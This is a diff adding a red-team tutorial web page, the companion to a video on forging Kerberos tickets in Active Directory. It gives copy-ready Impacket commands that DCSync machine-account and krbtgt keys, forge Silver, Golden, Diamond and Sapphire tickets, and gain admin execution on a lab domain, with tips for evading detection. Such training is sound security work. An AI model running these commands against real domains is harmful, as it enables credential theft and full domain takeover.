@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-9PBD5KP569"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-9PBD5KP569');
+  </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Kerberos Attacks Part 3: Silver, Golden, Diamond & Sapphire Tickets — m0rn1ngstr</title>
+  <meta name="description" content="Forging Kerberos tickets — Silver, Golden, Diamond, and Sapphire. What each one is, what you need to build it, and the OPSEC trade-offs. The finale of the Kerberos series." />
+  <link rel="stylesheet" href="../style.css" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@latest/tabler-icons.min.css" />
+  <style>
+    .cmd-block { background:var(--surface); border:0.5px solid var(--border); border-radius:8px; overflow:hidden; margin-bottom:12px; }
+    .cmd-header { display:flex; justify-content:space-between; align-items:center; padding:7px 14px; border-bottom:0.5px solid var(--border); background:var(--surface2); }
+    .cmd-label { font-family:'JetBrains Mono',monospace; font-size:11px; color:var(--text-muted); }
+    .cmd-copy { font-family:'JetBrains Mono',monospace; font-size:10px; color:var(--mint); background:none; border:none; cursor:pointer; opacity:0.7; letter-spacing:0.5px; }
+    .cmd-copy:hover { opacity:1; }
+    .cmd-body { padding:12px 14px; font-family:'JetBrains Mono',monospace; font-size:12px; line-height:1.7; color:var(--mint); overflow-x:auto; white-space:pre-wrap; word-break:break-all; }
+    .cmd-comment { color:var(--text-muted); }
+    .ts-list { list-style:none; }
+    .ts-list li { display:flex; gap:12px; align-items:baseline; padding:8px 0; border-bottom:0.5px solid var(--border); font-size:13px; }
+    .ts-list li:last-child { border-bottom:none; }
+    .ts-time { font-family:'JetBrains Mono',monospace; font-size:11px; color:var(--red); min-width:40px; flex-shrink:0; }
+    .lab-card { background:var(--surface); border:0.5px solid var(--border); border-radius:8px; padding:10px 12px; margin-bottom:7px; text-decoration:none; display:block; transition:border-color 0.2s; }
+    .lab-card:hover { border-color:var(--red); }
+    .res-link { display:flex; align-items:center; gap:8px; padding:8px 10px; border-radius:6px; border:0.5px solid var(--border); margin-bottom:6px; text-decoration:none; transition:border-color 0.2s; background:var(--surface); }
+    .res-link:hover { border-color:var(--purple); }
+    a.card, a.card:visited { color:var(--text); }
+    .attack-divider { display:flex; align-items:center; gap:12px; margin:2.2rem 0 1rem; }
+    .attack-divider-label { font-family:'JetBrains Mono',monospace; font-size:12px; color:var(--red); letter-spacing:2px; text-transform:uppercase; white-space:nowrap; }
+    .attack-divider-line { flex:1; height:0.5px; background:var(--border); }
+    .ticket-note { font-size:13px; color:var(--text-muted); line-height:1.65; margin-bottom:1rem; }
+    .ticket-note strong { color:var(--text); font-weight:500; }
+  </style>
+</head>
+<body>
+
+<nav>
+  <a class="nav-logo" href="../index.html">m0rn1ngstr<span>.</span></a>
+  <div class="nav-links">
+    <a href="../about.html">about</a>
+    <a href="../videos.html" class="active">videos</a>
+    <a href="../talks.html">talks &amp; media</a>
+    <a href="../work.html">work</a>
+  </div>
+</nav>
+
+<div style="padding:0.9rem 2rem; font-family:'JetBrains Mono',monospace; font-size:11px; color:var(--text-muted); border-bottom:0.5px solid var(--border); display:flex; align-items:center; gap:8px;">
+  <a href="../index.html" style="color:var(--text-muted); text-decoration:none;">home</a>
+  <span style="color:var(--red); opacity:0.5;">/</span>
+  <a href="../videos.html" style="color:var(--text-muted); text-decoration:none;">videos</a>
+  <span style="color:var(--red); opacity:0.5;">/</span>
+  <span style="color:var(--text);">kerberos-attacks-part3</span>
+</div>
+
+<div style="max-width:1060px; margin:0 auto; display:grid; grid-template-columns:1fr 280px; gap:0;">
+
+  <!-- MAIN -->
+  <main style="padding:2.5rem 2rem; border-right:0.5px solid var(--border);">
+
+    <div style="display:flex; align-items:center; gap:8px; flex-wrap:wrap; margin-bottom:1rem;">
+      <span class="badge badge-hof" style="font-size:11px; padding:4px 10px;">Active Directory</span>
+      <span class="badge badge-neutral" style="font-size:11px; padding:4px 10px;">Kerberos</span>
+      <span class="badge badge-purple" style="font-size:11px; padding:4px 10px;">Red Team</span>
+      <span class="badge badge-neutral" style="font-size:11px; padding:4px 10px;">OPSEC</span>
+    </div>
+
+    <h1 style="font-size:1.6rem; font-weight:300; line-height:1.2; letter-spacing:-0.5px; margin-bottom:0.4rem;">Kerberos Attacks Part 3: Silver, Golden, Diamond &amp; Sapphire Tickets</h1>
+    <div style="font-family:'JetBrains Mono',monospace; font-size:12px; color:var(--text-muted); margin-bottom:1.5rem;">// part 3 · the finale of the Kerberos series</div>
+
+    <!-- VIDEO THUMBNAIL -->
+    <a href="https://youtu.be/NtxtlunPJzg" target="_blank"
+       style="display:block; width:100%; aspect-ratio:16/9; margin-bottom:2rem; border-radius:8px; overflow:hidden; border:0.5px solid var(--border); position:relative; text-decoration:none;">
+      <img src="https://img.youtube.com/vi/NtxtlunPJzg/maxresdefault.jpg"
+           alt="Kerberos Attacks Part 3: Silver, Golden, Diamond and Sapphire Tickets"
+           style="width:100%; height:100%; object-fit:cover; display:block;">
+      <div style="position:absolute; inset:0; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,0.25);">
+        <div style="width:64px; height:64px; border-radius:50%; background:var(--red); display:flex; align-items:center; justify-content:center;">
+          <i class="ti ti-player-play" style="color:#fff; font-size:24px; margin-left:3px;"></i>
+        </div>
+      </div>
+    </a>
+
+    <div class="section-head">overview</div>
+    <p style="font-size:14px; line-height:1.75; color:var(--text-muted); margin-bottom:1rem;">
+      The finale of the Kerberos series. Instead of stealing a ticket, you build your own.
+      <strong style="color:var(--text); font-weight:500;">Ticket forging</strong> creates Kerberos tickets
+      without going through normal authentication, letting you impersonate a user or service. Four types,
+      from the service-scoped <strong style="color:var(--text); font-weight:500;">Silver</strong> to the
+      domain-wide <strong style="color:var(--text); font-weight:500;">Golden</strong>, and the stealthier
+      <strong style="color:var(--text); font-weight:500;">Diamond</strong> and
+      <strong style="color:var(--text); font-weight:500;">Sapphire</strong> that start from a legitimate ticket.
+    </p>
+
+    <div style="height:0.5px; background:var(--border); margin:2rem 0;"></div>
+
+    <div class="section-head">commands used</div>
+
+    <!-- SILVER -->
+    <div class="attack-divider">
+      <span class="attack-divider-label">// silver ticket</span>
+      <div class="attack-divider-line"></div>
+    </div>
+
+    <div style="font-family:'JetBrains Mono',monospace; font-size:10px; color:var(--text-muted); letter-spacing:1px; margin-bottom:10px;">// pick your target SPN</div>
+    <div style="overflow-x:auto; margin-bottom:1.2rem;">
+      <table style="width:100%; border-collapse:collapse; font-size:12px; min-width:480px;">
+        <thead>
+          <tr style="border-bottom:0.5px solid var(--border);">
+            <th style="text-align:left; padding:8px 10px; font-family:'JetBrains Mono',monospace; font-size:10px; color:var(--red); letter-spacing:1px; text-transform:uppercase; font-weight:500;">SPN / Service</th>
+            <th style="text-align:left; padding:8px 10px; font-family:'JetBrains Mono',monospace; font-size:10px; color:var(--red); letter-spacing:1px; text-transform:uppercase; font-weight:500;">Access / Capability</th>
+            <th style="text-align:left; padding:8px 10px; font-family:'JetBrains Mono',monospace; font-size:10px; color:var(--red); letter-spacing:1px; text-transform:uppercase; font-weight:500;">Required Key</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr style="border-bottom:0.5px solid var(--border);">
+            <td style="padding:8px 10px; font-family:'JetBrains Mono',monospace; color:var(--mint);">CIFS</td>
+            <td style="padding:8px 10px; color:var(--text-muted);">SMB shares / file system access</td>
+            <td style="padding:8px 10px; color:var(--text-muted);">Host machine account</td>
+          </tr>
+          <tr style="border-bottom:0.5px solid var(--border);">
+            <td style="padding:8px 10px; font-family:'JetBrains Mono',monospace; color:var(--mint);">LDAP</td>
+            <td style="padding:8px 10px; color:var(--text-muted);">LDAP operations; DC account key can enable DCSync</td>
+            <td style="padding:8px 10px; color:var(--text-muted);">DC machine account</td>
+          </tr>
+          <tr style="border-bottom:0.5px solid var(--border);">
+            <td style="padding:8px 10px; font-family:'JetBrains Mono',monospace; color:var(--mint);">HOST + RPCSS</td>
+            <td style="padding:8px 10px; color:var(--text-muted);">WMI</td>
+            <td style="padding:8px 10px; color:var(--text-muted);">Host machine account</td>
+          </tr>
+          <tr style="border-bottom:0.5px solid var(--border);">
+            <td style="padding:8px 10px; font-family:'JetBrains Mono',monospace; color:var(--mint);">HOST + CIFS</td>
+            <td style="padding:8px 10px; color:var(--text-muted);">PsExec-style execution, scheduled tasks</td>
+            <td style="padding:8px 10px; color:var(--text-muted);">Host machine account</td>
+          </tr>
+          <tr style="border-bottom:0.5px solid var(--border);">
+            <td style="padding:8px 10px; font-family:'JetBrains Mono',monospace; color:var(--mint);">HOST + HTTP/WSMAN</td>
+            <td style="padding:8px 10px; color:var(--text-muted);">WinRM / PowerShell Remoting</td>
+            <td style="padding:8px 10px; color:var(--text-muted);">Host machine account</td>
+          </tr>
+          <tr>
+            <td style="padding:8px 10px; font-family:'JetBrains Mono',monospace; color:var(--mint);">MSSQLSvc</td>
+            <td style="padding:8px 10px; color:var(--text-muted);">SQL access as sysadmin</td>
+            <td style="padding:8px 10px; color:var(--text-muted);">SQL service account</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">get the domain SID</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `lookupsid.py controller.local/Administrator:'P@$$W0rd'@10.114.132.238 0`)">copy</button>
+      </div>
+      <div class="cmd-body">lookupsid.py controller.local/Administrator:'P@$$W0rd'@10.114.132.238 0</div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">dump the machine account AES key (DCSync — noisy)</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `secretsdump.py controller.local/Administrator:'P@$$W0rd'@10.114.132.238 -just-dc-user 'CONTROLLER-1$'`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># DCSync triggers a directory replication request, normally DC-to-DC traffic.
+# quieter methods exist, DCSync is used here for demonstration. grab the AES256 key.</span>
+secretsdump.py controller.local/Administrator:'P@$$W0rd'@10.114.132.238 \
+  -just-dc-user 'CONTROLLER-1$'</div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">forge the silver ticket (offline)</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `ticketer.py -aesKey &quot;38ad99bc...d3e3d2ed&quot; -domain-sid &quot;S-1-5-21-432953485-3795405108-1502158860&quot; -domain &quot;controller.local&quot; -spn &quot;cifs/controller-1.controller.local&quot; &quot;Administrator&quot; -duration 600`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># prefer AES, it blends with modern Kerberos traffic (RC4 stands out).
+# set a realistic -duration, long default lifetimes get flagged.</span>
+ticketer.py -aesKey "38ad99bc...d3e3d2ed" \
+  -domain-sid "S-1-5-21-432953485-3795405108-1502158860" \
+  -domain "controller.local" \
+  -spn "cifs/controller-1.controller.local" \
+  "Administrator" -duration 600</div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">load and use the ticket</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `export KRB5CCNAME=Administrator.ccache\nsmbclient.py -k -no-pass controller.local/Administrator@controller-1.controller.local`)">copy</button>
+      </div>
+      <div class="cmd-body">export KRB5CCNAME=Administrator.ccache
+smbclient.py -k -no-pass \
+  controller.local/Administrator@controller-1.controller.local</div>
+    </div>
+
+    <!-- GOLDEN -->
+    <div class="attack-divider">
+      <span class="attack-divider-label">// golden ticket</span>
+      <div class="attack-divider-line"></div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">dump the krbtgt AES key</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `secretsdump.py controller.local/Administrator:'P@$$W0rd'@10.114.132.238 -just-dc-user krbtgt`)">copy</button>
+      </div>
+      <div class="cmd-body">secretsdump.py controller.local/Administrator:'P@$$W0rd'@10.114.132.238 \
+  -just-dc-user krbtgt</div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">forge the golden ticket (offline)</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `ticketer.py -aesKey &quot;dfb51898...6acf1033&quot; -domain-sid &quot;S-1-5-21-432953485-3795405108-1502158860&quot; -domain &quot;controller.local&quot; &quot;Administrator&quot; -duration 10`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># no -spn this time, a TGT works across services domain-wide</span>
+ticketer.py -aesKey "dfb51898...6acf1033" \
+  -domain-sid "S-1-5-21-432953485-3795405108-1502158860" \
+  -domain "controller.local" \
+  "Administrator" -duration 10</div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">load and use the ticket</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `export KRB5CCNAME=Administrator.ccache\npsexec.py -k -no-pass controller.local/Administrator@controller-1.controller.local`)">copy</button>
+      </div>
+      <div class="cmd-body">export KRB5CCNAME=Administrator.ccache
+psexec.py -k -no-pass \
+  controller.local/Administrator@controller-1.controller.local</div>
+    </div>
+
+    <!-- DIAMOND -->
+    <div class="attack-divider">
+      <span class="attack-divider-label">// diamond ticket</span>
+      <div class="attack-divider-line"></div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">request a legit TGT and modify it into a diamond</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `ticketer.py -request -domain &quot;controller.local&quot; -user &quot;lowpriv1&quot; -password 'Pass123!' -aesKey 'dfb51898...6acf1033' -domain-sid &quot;S-1-5-21-432953485-3795405108-1502158860&quot; -groups 512,513,518,519,520 lowpriv1`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># -request pulls a real TGT first, then rewrites the PAC with the groups you set.
+# 512=Domain Admins, 513=Domain Users, 518/519/520=Schema/Enterprise/Group Policy admins</span>
+ticketer.py -request -domain "controller.local" \
+  -user "lowpriv1" -password 'Pass123!' \
+  -aesKey 'dfb51898...6acf1033' \
+  -domain-sid "S-1-5-21-432953485-3795405108-1502158860" \
+  -groups 512,513,518,519,520 lowpriv1</div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">inspect, load and use</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `export KRB5CCNAME=lowpriv1.ccache\ndescribeTicket.py lowpriv1.ccache\npsexec.py -k -no-pass controller.local/lowpriv1@controller-1.controller.local`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># describeTicket.py shows the ticket's contents (etype, flags, PAC)</span>
+export KRB5CCNAME=lowpriv1.ccache
+describeTicket.py lowpriv1.ccache
+psexec.py -k -no-pass \
+  controller.local/lowpriv1@controller-1.controller.local</div>
+    </div>
+
+    <!-- SAPPHIRE -->
+    <div class="attack-divider">
+      <span class="attack-divider-label">// sapphire ticket</span>
+      <div class="attack-divider-line"></div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">forge the sapphire ticket</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `ticketer.py -request -impersonate 'Administrator' -domain &quot;controller.local&quot; -user &quot;lowpriv1&quot; -password 'Pass123!' -aesKey 'dfb51898...6acf1033' -nthash '72cd714611b64cd4d5550cd2759db3f6' -domain-sid &quot;S-1-5-21-432953485-3795405108-1502158860&quot; lowpriv1`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># -impersonate triggers S4U2self+U2U to pull the target's real PAC.
+# if you hit KDC_ERR_TGT_REVOKED, add -user-id with the target's RID.</span>
+ticketer.py -request -impersonate 'Administrator' \
+  -domain "controller.local" -user "lowpriv1" -password 'Pass123!' \
+  -aesKey 'dfb51898...6acf1033' \
+  -nthash '72cd714611b64cd4d5550cd2759db3f6' \
+  -domain-sid "S-1-5-21-432953485-3795405108-1502158860" lowpriv1</div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">inspect, load and use</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `export KRB5CCNAME=lowpriv1.ccache\ndescribeTicket.py lowpriv1.ccache\npsexec.py -k -no-pass controller.local/Administrator@controller-1.controller.local`)">copy</button>
+      </div>
+      <div class="cmd-body">export KRB5CCNAME=lowpriv1.ccache
+describeTicket.py lowpriv1.ccache
+psexec.py -k -no-pass \
+  controller.local/Administrator@controller-1.controller.local</div>
+    </div>
+
+  </main>
+
+  <!-- SIDEBAR -->
+  <aside style="padding:2.5rem 1.5rem;">
+
+    <div style="margin-bottom:2rem;">
+      <div class="section-head">kerberos series</div>
+      <a href="kerberos-attacks-part1.html" class="lab-card">
+        <div style="font-family:'JetBrains Mono',monospace; font-size:10px; color:var(--red); letter-spacing:1px; margin-bottom:3px;">Part 1</div>
+        <div style="font-size:12px; font-weight:500; color:var(--text);">Enumeration, Kerberoasting &amp; AS-REP Roasting</div>
+      </a>
+      <a href="kerberos-attacks-part2.html" class="lab-card">
+        <div style="font-family:'JetBrains Mono',monospace; font-size:10px; color:var(--red); letter-spacing:1px; margin-bottom:3px;">Part 2</div>
+        <div style="font-size:12px; font-weight:500; color:var(--text);">Ticket Harvesting &amp; Pass-the-Ticket</div>
+      </a>
+      <a href="kerberos-attacks-part3.html" class="lab-card" style="border-color:var(--red-border);">
+        <div style="font-family:'JetBrains Mono',monospace; font-size:10px; color:var(--red); letter-spacing:1px; margin-bottom:3px;">Part 3 · you are here</div>
+        <div style="font-size:12px; font-weight:500; color:var(--text);">Silver, Golden, Diamond &amp; Sapphire</div>
+      </a>
+      <a href="https://youtube.com/playlist?list=PL0XlvOUlwREcUpPEhs7Z5yhCnROR3fjhB" target="_blank" class="lab-card">
+        <div style="font-family:'JetBrains Mono',monospace; font-size:10px; color:var(--purple); letter-spacing:1px; margin-bottom:3px;">Playlist</div>
+        <div style="font-size:12px; font-weight:500; color:var(--text);">Full series on YouTube ↗</div>
+      </a>
+    </div>
+
+    <div style="margin-bottom:2rem;">
+      <div class="section-head">lab to practice</div>
+      <a href="https://tryhackme.com/room/attackingkerberos" target="_blank" class="lab-card">
+        <div style="font-family:'JetBrains Mono',monospace; font-size:10px; color:var(--red); letter-spacing:1px; margin-bottom:3px;">TryHackMe</div>
+        <div style="font-size:12px; font-weight:500; color:var(--text);">Attacking Kerberos</div>
+        <div style="font-size:11px; color:var(--text-muted); margin-top:2px;">intermediate · AD enumeration &amp; attacks</div>
+      </a>
+    </div>
+
+    <div style="margin-bottom:2rem;">
+      <div class="section-head">resources</div>
+      <a href="https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/" target="_blank" class="res-link">
+        <i class="ti ti-book" style="font-size:14px; color:var(--text-muted); flex-shrink:0;"></i>
+        <div>
+          <div style="font-size:12px; font-weight:500; color:var(--text);">The Hacker Recipes — Forged tickets</div>
+          <div style="font-size:11px; color:var(--text-muted);">thehacker.recipes</div>
+        </div>
+      </a>
+      <a href="https://swisskyrepo.github.io/InternalAllTheThings/active-directory/kerberos-tickets/" target="_blank" class="res-link">
+        <i class="ti ti-book" style="font-size:14px; color:var(--text-muted); flex-shrink:0;"></i>
+        <div>
+          <div style="font-size:12px; font-weight:500; color:var(--text);">InternalAllTheThings — Kerberos tickets</div>
+          <div style="font-size:11px; color:var(--text-muted);">swisskyrepo.github.io</div>
+        </div>
+      </a>
+      <a href="https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/silver-ticket.html" target="_blank" class="res-link">
+        <i class="ti ti-book" style="font-size:14px; color:var(--text-muted); flex-shrink:0;"></i>
+        <div>
+          <div style="font-size:12px; font-weight:500; color:var(--text);">HackTricks — Silver Ticket</div>
+          <div style="font-size:11px; color:var(--text-muted);">hacktricks.wiki</div>
+        </div>
+      </a>
+      <a href="https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/golden-ticket.html" target="_blank" class="res-link">
+        <i class="ti ti-book" style="font-size:14px; color:var(--text-muted); flex-shrink:0;"></i>
+        <div>
+          <div style="font-size:12px; font-weight:500; color:var(--text);">HackTricks — Golden Ticket</div>
+          <div style="font-size:11px; color:var(--text-muted);">hacktricks.wiki</div>
+        </div>
+      </a>
+      <a href="https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/diamond-ticket.html" target="_blank" class="res-link">
+        <i class="ti ti-book" style="font-size:14px; color:var(--text-muted); flex-shrink:0;"></i>
+        <div>
+          <div style="font-size:12px; font-weight:500; color:var(--text);">HackTricks — Diamond &amp; Sapphire</div>
+          <div style="font-size:11px; color:var(--text-muted);">hacktricks.wiki</div>
+        </div>
+      </a>
+      <a href="https://github.com/fortra/impacket" target="_blank" class="res-link">
+        <i class="ti ti-tool" style="font-size:14px; color:var(--text-muted); flex-shrink:0;"></i>
+        <div>
+          <div style="font-size:12px; font-weight:500; color:var(--text);">Impacket</div>
+          <div style="font-size:11px; color:var(--text-muted);">github.com/fortra</div>
+        </div>
+      </a>
+    </div>
+
+    <div>
+      <div class="section-head">relevant certs</div>
+      <div style="display:flex; flex-wrap:wrap; gap:6px;">
+        <span class="cert-pill">OSCP</span>
+        <span class="cert-pill">OSEP</span>
+        <span class="cert-pill">CRTO</span>
+      </div>
+    </div>
+
+  </aside>
+</div>
+
+<footer>
+  <div class="footer-links">
+    <a href="https://youtube.com/@m0rn1ngstr" target="_blank"><i class="ti ti-brand-youtube"></i> YouTube</a>
+    <a href="https://x.com/m0rn1ngstr" target="_blank"><i class="ti ti-brand-x"></i> X</a>
+    <a href="https://www.linkedin.com/in/katerina-shevchenko01/" target="_blank"><i class="ti ti-brand-linkedin"></i> LinkedIn</a>
+  </div>
+  <span>// hello, friend. &copy; 2026 m0rn1ngstr</span>
+</footer>
+
+<script>
+  function copyCmd(btn, text) {
+    navigator.clipboard.writeText(text).then(() => {
+      const orig = btn.textContent;
+      btn.textContent = 'copied!';
+      setTimeout(() => btn.textContent = orig, 1500);
+    });
+  }
+</script>
+
+</body>
+</html>
